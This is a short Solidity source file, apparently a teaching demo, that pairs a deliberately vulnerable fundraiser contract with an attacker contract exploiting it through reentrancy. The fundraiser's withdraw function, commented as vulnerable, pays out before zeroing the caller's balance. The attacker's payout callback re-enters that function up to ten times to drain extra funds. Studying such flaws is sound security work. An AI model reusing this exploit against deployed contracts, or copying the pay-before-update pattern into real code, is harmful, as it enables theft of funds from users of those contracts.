pragma solidity ^0.4.16;

contract VulnerableFundraiser {

    mapping(address=>uint) balances;

    function VulnerableFundraiser(address fundraiserAddress)  payable public {
        
    }
    

    // VULNERABLE
    function withdrawAllMyCoins() payable public {
    
        uint widthdrawAmout = balances[msg.sender];
        MaliciousWallet wallet = MaliciousWallet(msg.sender);
        wallet.payout.value(widthdrawAmout)();
        
        balances[msg.sender] = 0;   
    
    }

    function getBalance() constant public returns (uint) {
        return this.balance;
    }
    
    function contribute() payable public {
        balances[msg.sender] = msg.value;
    }
        
        
    function() payable public {
    
        
    }

}

contract MaliciousWallet {

    VulnerableFundraiser fundraiser;
    uint recursions = 10;
    
    function MaliciousWallet(address fundraiserAddress) payable public {
    fundraiser = VulnerableFundraiser(fundraiserAddress);
    }
    
    function  contribute(uint amount) public {
        
        fundraiser.contribute.value(amount)();
    }
    
    function widthDraw() public {
       fundraiser.withdrawAllMyCoins();
    }
    
    function getBalance() constant public returns (uint)  {
        return this.balance;
    }
    
    function payout()  payable public { 
    
        //exploit - using recursion
        
        
        if (recursions > 0) { // Don't loop forever
            recursions--;
            fundraiser.withdrawAllMyCoins(); // Hey before you set my balance to 0 give me more!
        }
        
        
    
    }
    
    function()  payable public {
    
        
    }
    
}